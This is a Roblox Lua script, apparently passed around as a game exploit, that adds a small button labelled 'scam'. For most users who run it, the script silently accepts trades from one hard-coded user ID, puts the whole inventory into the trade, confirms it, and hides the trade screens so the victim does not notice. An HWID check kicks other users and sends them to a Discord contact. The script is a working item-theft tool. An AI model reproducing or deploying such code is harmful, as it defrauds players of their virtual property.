local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local hwidik = game:GetService("RbxAnalyticsService"):GetClientId()
if hwidik==HWID then
	local Mobile = Instance.new("ScreenGui")
	local TextButton = Instance.new("TextButton")
	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	local UICorner = Instance.new("UICorner")

	--Properties:

	Mobile.Name = "Mobile"
	Mobile.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	Mobile.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	TextButton.Parent = Mobile
	TextButton.BackgroundColor3 = Color3.fromRGB(0, 85, 0)
	TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextButton.BorderSizePixel = 0
	TextButton.Position = UDim2.new(0.00910194218, 0, 0.456551731, 0)
	TextButton.Size = UDim2.new(0.0618932024, 0, 0.162939295, 0)
	TextButton.Font = Enum.Font.SourceSans
	TextButton.Text = "scam"
	TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
	TextButton.TextSize = 18.000

	UIAspectRatioConstraint.Parent = TextButton

	UICorner.CornerRadius = UDim.new(0, 25)
	UICorner.Parent = TextButton

	Mobile.TextButton.TouchTap:Connect(function()
		print("wait...")
	end)
	if game.Players.localPlayer.UserId ~= 1952523040 then
		
		while task.wait() do
			game.Players.LocalPlayer.PlayerGui.Trading.TradingInfo.TradingMessage.Visible = false
			local args = {
				[1] = 1952523040,
				[2] = true
			}

			game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Trade"):WaitForChild("RespondToRequest"):FireServer(unpack(args))
			if game.Players.LocalPlayer.PlayerGui.Trading.Trading.TradingScreen.Visible == true then
				game.Players.LocalPlayer.PlayerGui.Trading.Trading.TradingScreen.Visible = false
				for i,v in pairs(game.Players.LocalPlayer.PlayerGui.Trading.Trading.TradingScreen.PlayerScreen.PlayerInv:GetChildren()) do
					if v.Name ~= "UIGridLayout" then
						local args = {
							[1] = v.Name
						}
						game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Trade"):WaitForChild("SelectTower"):FireServer(unpack(args))
					end
				end
				game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Trade"):WaitForChild("Ready"):FireServer()
				while task.wait() do
					game:GetService("Players").LocalPlayer.PlayerGui.Trading.TradingInfo.TradeSuccesful.Visible = false
				end
			end
		end
	end
else
	setclipboard(game:GetService("RbxAnalyticsService"):GetClientId())
	wait(1)
	game.Players.LocalPlayer:Kick("HWID не найден, напиши van1chh в дискорде")
end
